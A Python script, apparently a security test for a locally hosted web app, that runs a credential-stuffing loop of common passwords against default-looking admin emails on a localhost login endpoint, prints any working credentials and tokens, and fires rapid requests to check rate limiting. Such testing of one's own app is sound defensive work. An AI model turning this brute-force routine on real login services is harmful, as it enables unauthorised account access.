#!/usr/bin/env python3
"""
Brute Force Login Attack Simulation
Tests credential stuffing and rapid login attempts
"""

import requests
import time
import random
from faker import Faker

fake = Faker()
BASE_URL = "http://localhost:3001"

# Common passwords for credential stuffing
COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "12345678",
    "qwerty", "abc123", "monkey", "1234567", "letmein",
    "trustno1", "dragon", "baseball", "iloveyou", "master",
    "sunshine", "ashley", "bailey", "passw0rd", "shadow"
]

# Common email patterns
EMAIL_PATTERNS = [
    "admin@example.com", "test@test.com", "user@user.com",
    "admin@admin.com", "root@localhost", "test@example.com"
]

def brute_force_login():
    """Simulate credential stuffing attack"""
    print("Starting Brute Force Login Attack...")
    print(f"Target: {BASE_URL}/api/auth/login\n")
    
    attack_count = 0
    success_count = 0
    
    for email in EMAIL_PATTERNS:
        for password in COMMON_PASSWORDS[:5]:
            try:
                response = requests.post(
                    f"{BASE_URL}/api/auth/login",
                    json={"email": email, "password": password},
                    timeout=5
                )
                attack_count += 1
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"SUCCESS: {email}:{password}")
                    print(f"   Token: {response.json().get('token', 'N/A')[:50]}...")
                else:
                    print(f"ailed: {email}:{password} - Status: {response.status_code}")
                
                # Delay to simulate real attack
                time.sleep(0.5)
                
            except Exception as e:
                print(f"Error: {e}")
                attack_count += 1
    
    print(f"\n Attack Summary:")
    print(f"   Total attempts: {attack_count}")
    print(f"   Successful logins: {success_count}")
    print(f"   Success rate: {(success_count/attack_count)*100:.2f}%")

def rapid_login_attempts():
    """Simulate rapid login attempts (rate limiting test)"""
    print("\n⚡ Starting Rapid Login Attempts...")
    
    email = fake.email()
    attempts = 20
    
    for i in range(attempts):
        try:
            response = requests.post(
                f"{BASE_URL}/api/auth/login",
                json={"email": email, "password": fake.password()},
                timeout=5
            )
            print(f"Attempt {i+1}/{attempts}: Status {response.status_code}")
            time.sleep(0.1)  # Very rapid requests
        except Exception as e:
            print(f"Error on attempt {i+1}: {e}")
    
    print("Rapid attack completed\n")

if __name__ == "__main__":
    brute_force_login()
    rapid_login_attempts()
